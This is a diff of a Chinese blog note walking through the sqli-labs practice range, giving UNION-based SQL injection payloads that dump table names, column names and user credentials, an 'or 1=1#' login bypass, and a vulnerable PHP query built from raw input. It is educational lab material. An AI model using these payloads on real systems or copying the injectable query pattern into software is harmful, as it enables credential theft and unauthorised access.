@@ -6,18 +6,96 @@ description: 本篇介绍sqli-labs靶场的通关教程
 tags: [sql]
 category: 笔记
 ---
-  
-# 联合注入
 
-## less-1~4
+### 关于sql注入：
 
-# 报错注入
+**1.找到可能存在注入点的地方**
+
+每个前后端交互的地方都有可能存在注入点
+
+**2.判断闭合及注释方式**
+
+**3.有无回显，报错及报错方式**
+
+此步骤将决定了使用哪种注入方式
+
+**4.测试列数及回显位**
+
+此步骤仅用于联合注入
+
+**5.探测数据库指纹**
+
+本篇数据库均为MySql（探测方法）
+
+**6.使用查询语句**
+
+
+# GET-联合注入
+
+## less-1
+
+**1.判断闭合方式及有无回显**
+
+当输入`id=1`时，页面有回显
+
+经过尝试发现是单引号闭合，即`?id=1'--+`
+
+
+**2.判断列数**
+
+![](<https://img.remit.ee/i/EUoE8LCnC1wh>)
+
+**3.回显位**
+
+![](<https://img.remit.ee/i/ffQFUQzhgyDY>)
+
+注意`-1`
+
+原因：当`id=1`时，页面只能返回一组数据，回显位被占据无法显示数字
+
+**4.数据**
+
+表名：
+
+    ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
+
+![](<https://img.remit.ee/i/bQkjenwqM6M3>)
+
+注：联合注入语法为`union select 1,2,3 from...where...`不要把回显数字标错地方
+
+注：因为显示只有两个，但我们查询的数据不止两条，因此要用`group_concat`函数将表名等内容连接成一整行显示
+
+列名：
+
+    ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'--+
+
+![](<https://img.remit.ee/i/YWebqhAMpeIl>)
+
+数据名：
+
+    ?id=-1' union select 1,2,group_concat(username,' ',password) from users--+
+
+![](<https://img.remit.ee/i/UoKos8jnvVlh>)
+
+## less-2
+
+数字型闭合`?id=1`
+
+## less-3
+
+字符型闭合`?id=1')`
+
+## less-4
+
+字符型闭合`?id=1")`
+
+# GET-报错注入
 
 ## less-5~6
 
-(详情以后再说)
+//concat 与 groupc_concat的区别
 
-# 布尔盲注
+# GET-布尔盲注
 
 ## less-7
 
@@ -168,10 +246,10 @@ category: 笔记
 
 ![](<https://img.remit.ee/i/TCmLm6XllzJD>)
 
-# 时间盲注
+# GET-时间盲注
 ## less-9
 
-发现无论我们输入什么页面都不能返回错误信息，因此考虑时间注入
+发现无论我们输入什么页面都不能返回错误信息，因此考虑时间盲注
 
 ![](https://picgocloud.com/m/624d06f9-d985-431f-b325-d9cb009d8b35.png)
 
@@ -244,3 +322,78 @@ category: 笔记
 ## less-10
 
 同less-9一致，仅闭合方式不同`"`
+
+# POST-联合注入
+## less-11
+
+**1.判断闭合方式**
+
+首先是闭合方式 `'`为单引号闭合
+
+然后是末尾的注释 发现`--+`不再适用，换`#`
+
+    ' #
+
+![](https://picgocloud.com/m/30a094a6-2f07-4e6d-872f-1844b2f2ff02.png)
+
+
+**2.判断有无回显**
+
+我们在输入框输入
+
+    username：' or 1=1#    
+    password:123456       
+
+`' or 1=1#`是万能密码，保证`username`一定是对的
+
+`#`把`password`那一部分的验证条件注释掉了，因此无论我们在`password`这一栏输入什么都是正确的
+
+less-11后端大致代码：
+
+    $sql = "SELECT username, password FROM users WHERE username='$uname' AND password='$pass' LIMIT 0,1";
+    $result = mysqli_query($con, $sql);
+    $row = mysqli_fetch_array($result);
+    if($row) {
+    echo "Your Login name: " . $row['username']; 
+    echo "Your Password: " . $row['password']; 
+    }
+
+输入后我们可以看到页面有回显
+
+![](https://picgocloud.com/m/41eab142-af5e-4a8c-932c-1e22181b4015.png)
+
+**3.判断列数及回显位**
+
+    ' order by 2#
+
+页面正常
+
+回显位：
+
+    ' union select 1,2#
+
+![](https://picgocloud.com/m/3aa1945f-69f7-4778-b2fa-52de9ab34e64.png)
+
+**4.获取数据**
+
+找到了回显位，接下来就能得到想要的内容
+
+表名：
+
+    ' union select group_concat(table_name),1 from information_schema.tables where table_schema=database()#
+
+![](https://picgocloud.com/m/c71fc545-af18-4a8d-9d7d-d6655c03aeee.png)
+
+
+
+字段名：
+
+    ' union select group_concat(column_name),1 from information_schema.columns where table_schema=database() and table_name='users'#
+
+![](https://picgocloud.com/m/c257a5eb-8e4f-4078-a805-30ef4d49298a.png)
+
+数据：
+
+    ' union select group_concat(username,' ',password),1 from users #
+
+![](https://picgocloud.com/m/454e5df3-9f83-49bb-8137-d9957bf17714.png)
